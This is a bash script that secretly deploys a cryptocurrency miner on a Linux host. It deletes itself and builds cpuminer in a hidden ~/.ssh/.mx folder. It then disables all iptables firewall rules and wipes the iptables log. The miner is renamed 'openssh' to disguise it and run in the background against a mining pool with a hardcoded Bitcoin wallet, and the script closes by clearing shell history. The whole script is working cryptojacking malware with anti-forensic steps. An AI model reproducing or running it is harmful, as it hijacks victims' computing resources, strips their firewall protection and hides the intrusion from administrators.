#!/bin/bash

rm -r -f $0

apt-get install build-essential -y > /dev/null
clear
apt-get install libcurl4-openssl-dev -y > /dev/null
clear
apt-get install gcc -y > /dev/null
clear
apt-get install automake -y > /dev/null
clear
apt-get install make -y > /dev/null
clear
apt-get install git -y > /dev/null
clear
apt-get install autoconf -y > /dev/null
clear
apt-get install automake -y > /dev/null
clear

mkdir ~/.ssh
clear

git clone https://github.com/noncepool/cpuminer-yescrypt.git ~/.ssh/.mx > /dev/null
clear

cd ~/.ssh/.mx
clear

./autogen.sh
clear

./configure CFLAGS="-O3"
clear

make
clear

sysctl -w net.ipv4.ip_forward=0
clear

echo -n > /var/log/iptables.log
clear

iptables -F
clear

iptables -X
clear

iptables -Z
clear

iptables -P INPUT ACCEPT
clear

iptables -P FORWARD ACCEPT
clear

iptables -P OUTPUT ACCEPT
clear

mv minerd openssh
clear

nohup ./openssh -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u 1Loch2rNJWp3eNgUjiZaa92nZvQyP9pT6F -p c=BTC &

clear

echo " "
clear

cd ~/
clear

history -c
clear
